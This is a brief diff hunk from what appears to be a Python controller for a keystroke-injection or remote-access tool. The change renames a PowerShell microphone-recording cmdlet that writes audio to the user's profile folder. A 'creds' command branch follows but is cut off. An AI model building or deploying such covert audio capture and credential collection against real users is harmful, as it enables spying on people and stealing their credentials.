@@ -342,7 +342,7 @@ while not stop:
             if len(options) > 0:
                 length = int(options[0])
             commands = []
-            commands.append("Get-MicrophoneAudio -path \"$env:userprofile/z/audio.mp3\" -length " + str(length))
+            commands.append("Get-Audio -path \"$env:userprofile/z/audio.mp3\" -length " + str(length))
             stdin = "; ".join(commands)
         elif ducky_command[:5] == "creds":
             commands = []
